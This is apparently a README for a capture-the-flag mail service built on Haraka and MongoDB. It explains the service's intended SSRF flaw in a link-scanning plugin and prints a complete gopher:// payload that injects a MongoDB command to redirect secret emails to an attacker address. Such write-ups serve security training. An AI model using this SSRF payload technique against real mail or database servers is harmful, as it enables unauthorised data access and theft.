# Secure Mail

The service is a simple mail system.

It consists of two parts:
1. SMTP server that scans emails for malicious links and pass clean emails to user.
2. Web interface that allows users to view emails.

The checker put flags to emails. Teams should add themselves to the email's `rcpt_to` to steal flags.

The service is written on Node.JS and uses [Haraka](http://haraka.github.io/) as a SMTP server, [MongoDB](https://www.mongodb.com/) as a database and [ClamAV](https://www.clamav.net/) as an antivirus engine.
Haraka plugin uses `curl` to download files.

# Vulnerability

The primary way to steal flags is to exploit a SSRF vulnerability in Haraka plugin (`safelinks`).
An attacker can send an arbitrary MongoDB command via Gopher protocol.

For example, the attacker could send email with URL `gopher://mongodb:27017/1%47%01%00%00%0b%00%00%00%00%00%00%00%dd%07%00%00%01%00%00%00%01%d8%00%00%00%75%70%64%61%74%65%73%00%cc%00%00%00%03%71%00%21%00%00%00%02%73%75%62%6a%65%63%74%00%0f%00%00%00%53%65%63%72%65%74%20%6d%65%73%73%61%67%65%00%00%03%75%00%8f%00%00%00%03%24%61%64%64%54%6f%53%65%74%00%7f%00%00%00%03%72%63%70%74%5f%74%6f%00%71%00%00%00%02%6f%72%69%67%69%6e%61%6c%00%16%00%00%00%3c%68%61%63%6b%65%72%40%63%74%66%2e%68%69%74%62%2e%6f%72%67%3e%00%02%6f%72%69%67%69%6e%61%6c%5f%68%6f%73%74%00%0d%00%00%00%63%74%66%2e%68%69%74%62%2e%6f%72%67%00%02%68%6f%73%74%00%0d%00%00%00%63%74%66%2e%68%69%74%62%2e%6f%72%67%00%02%75%73%65%72%00%07%00%00%00%68%61%63%6b%65%72%00%00%00%00%08%6d%75%6c%74%69%00%01%08%75%70%73%65%72%74%00%00%00%00%55%00%00%00%02%75%70%64%61%74%65%00%06%00%00%00%69%6e%62%6f%78%00%08%6f%72%64%65%72%65%64%00%01%03%6c%73%69%64%00%1e%00%00%00%05%69%64%00%10%00%00%00%04%c8%0f%10%cd%9f%fa%42%65%8f%c5%47%49%d7%99%16%15%00%02%24%64%62%00%07%00%00%00%65%6d%61%69%6c%73%00%00%af%82%0c%ad` to execute command `db.inbox.updateMany({subject : "Secret message"}, { $addToSet: { rcpt_to: { "original" : "<hacker@ctf.hitb.org>", "original_host" : "ctf.hitb.org", "host" : "ctf.hitb.org", "user" : "hacker" } } })`.

The exploit can be found at [/sploits/secure-mail/secure-mail.exploit.py](../../sploits/secure-mail/secure-mail.exploit.py).
